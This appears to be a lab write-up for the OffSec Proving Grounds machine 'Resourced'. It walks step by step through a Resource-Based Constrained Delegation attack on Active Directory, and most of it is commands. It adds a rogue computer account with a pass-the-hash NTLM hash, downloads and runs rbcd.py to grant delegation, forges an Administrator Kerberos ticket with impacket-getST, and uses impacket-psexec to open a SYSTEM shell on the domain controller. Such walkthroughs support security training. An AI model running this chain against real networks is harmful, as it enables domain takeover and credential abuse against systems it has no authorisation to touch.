# GenericAll permissions to the computer
Full control of a computer object can be used to perform a **Resource-Based Constrained Delegation** attack.
# Resource-Based Constrained Delegation (RBCD) attack
![image](https://github.com/user-attachments/assets/4df51b16-fb7c-4262-8d8c-e811e3e9586f)
## Linux Abuse
1. if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added :
``` shell
impacket-addcomputer Domain/user -dc-ip <Domain-IP> -hashes :<ntlm> -computer-name 'dork' -computer-pass 'dork'
```
Example
```shell
impacket-addcomputer resourced.local/l.livingstone -dc-ip Resourced -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'dork' -computer-pass 'dork'
```
![image](https://github.com/user-attachments/assets/fc9729cc-abc7-451a-8fbe-4287acd7dcbf)
2. Check if computer added from attacker side machine
```powershell
Get-ADComputer dork
```
![image](https://github.com/user-attachments/assets/183f67bd-7adf-4a5d-94df-39b3960913a8)
3. Modify Delegation Rights Using rbcd.py
```shell
wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py
sudo python3 rbcd.py -dc-ip <Domain-IP> -t <Target-computer-hostname> -f <(Fake)-computer-hostname> -hashes :NTLM Domain\\user
```
![image](https://github.com/user-attachments/assets/cfbda49d-da17-46e1-ab23-c73a88ccaed3)

Example
```shell
sudo python3 rbcd.py -dc-ip Resourced -t RESOURCEDC -f 'dork' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
```
![image](https://github.com/user-attachments/assets/d62da4f0-1f86-42c5-bedb-5a4ba5cf2101)
4. Obtain a Privileged Kerberos Ticket Using impacket-getST
```shell
impacket-getST -spn cifs/resourcedc.resourced.local resourced/dork\$:'dork' -impersonate Administrator -dc-ip Resourced
```
![image](https://github.com/user-attachments/assets/686dc8d6-6f77-495b-b208-f9d40bf03300)
5. Rename Saved Tickets
```shell
mv Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache Administrator.ccache
```
6. Prepare the machine to use the ticket
```shell
sudo sh -c 'echo "192.168.180.175 resourcedc.resourced.local" >> /etc/hosts'
```
7. We need to export a new environment variable named KRB5CCNAME with the location of this file.
``` shell
export KRB5CCNAME=/home/kali/<KeyFolderPath>/Administrator.ccache
```
7. run impacket-psexec to drop us into a system shell.
```shell
sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip $IP
```
![image](https://github.com/user-attachments/assets/0604ac0e-3188-4ea8-973e-8792095dc811)

### Machine Name Offsec [PG](https://portal.offsec.com/labs/practice) Resourced
